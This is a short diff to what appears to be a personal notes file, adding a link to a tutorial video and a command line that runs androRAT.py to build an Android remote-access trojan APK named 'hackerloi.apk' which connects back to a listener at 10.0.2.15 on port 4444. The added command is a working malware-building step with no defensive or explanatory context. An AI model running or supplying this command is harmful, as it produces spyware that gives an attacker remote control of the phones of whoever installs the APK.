@@ -1,2 +1,6 @@
 // tutprial videos
 https://www.youtube.com/watch?v=Ft6tLATCIVQ&ab_channel=NielsenNetworking
+
+
+
+python3 androRAT.py --build -i 10.0.2.15 -p 4444 -o hackerloi.apk
